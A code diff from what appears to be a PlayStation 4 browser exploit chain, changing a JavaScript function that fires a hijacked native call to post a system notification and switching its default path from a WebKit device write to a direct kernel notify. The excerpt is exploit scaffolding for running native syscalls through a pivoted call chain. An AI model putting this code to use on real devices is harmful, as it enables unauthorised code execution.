@@ -5,7 +5,7 @@ import { int64 } from "./int64.js";
 import {
     prepNativeChain, firePivotGetpid, fireNativeCall,
     stageNotify, fireNotifyDevWrite, bisectDisarmG0, bisectRestorePivotOnly,
-} from "./native_call.js?v=nc-20250901e";
+} from "./native_call.js?v=nc-20250901f";
 import { captureParseIntMainMf, loadStubCap } from "./stub_call.js?v=stub-7";
 
 let g0Prep = null;
@@ -193,19 +193,19 @@ export function fireG0Getpid(p, off, lk, opts) {
     return { path: "g0-getpid", ret, errno: ret, ok: nativeRetOk(ret), prep };
 }
 
-/** G0 + notify — WebKit dev write path (Y2JB / remote_lua_loader). */
+/** G0 + notify — PS4 direct k_notify (BDJ/mast1c0re). Dev write needs post-breakout. */
 export function fireG0Notify(p, off, lk, opts) {
     opts = opts || {};
     if (!lk) throw new Error("g0 notify: need lk");
     if (g0AlreadyFired() && !opts.allowRefire)
         throw new Error("g0: already fired — reload tab before notify");
     const prep = ensureG0Prep(p, off, lk, opts);
-    const path = opts.notifyPath || "dev";
+    const path = opts.notifyPath || "direct";
     stubStep(opts, "G0-NOTIFY-FIRE", path + " lk=" + lk);
     const notifyOpts = {
         message: opts.message,
         iconUri: opts.iconUri,
-        format: opts.format || "osm",
+        format: opts.format || "plain",
         log: opts.log,
         fireOpts: {
             hook: opts.hook || "cell30",
@@ -219,11 +219,17 @@ export function fireG0Notify(p, off, lk, opts) {
         result = { path: "g0-notify-direct", ret, errno: ret, ok: nativeRetOk(ret), prep };
     } else {
         const r = fireNotifyDevWrite(p, prep, lk, off, notifyOpts);
-        result = { path: "g0-notify-dev", ret: 0, errno: 0, ok: r.ok, fd: r.fd, wr: r.wr, prep };
+        result = {
+            path: "g0-notify-dev", ret: r.wr, errno: 0,
+            ok: r.ok, fd: r.fd, wr: r.wr, close: r.close, prep,
+        };
     }
     postFireCleanup(p, prep, opts);
     markG0Fired("notify");
-    stubStep(opts, "G0-NOTIFY-DONE", result.path + " errno=" + result.errno
+    stubStep(opts, "G0-NOTIFY-DONE", result.path
+        + (result.path === "g0-notify-dev"
+            ? " fd=" + result.fd + " wr=" + result.wr
+            : " errno=" + result.errno)
         + (result.ok ? " OK" : " fail"));
     return result;
 }
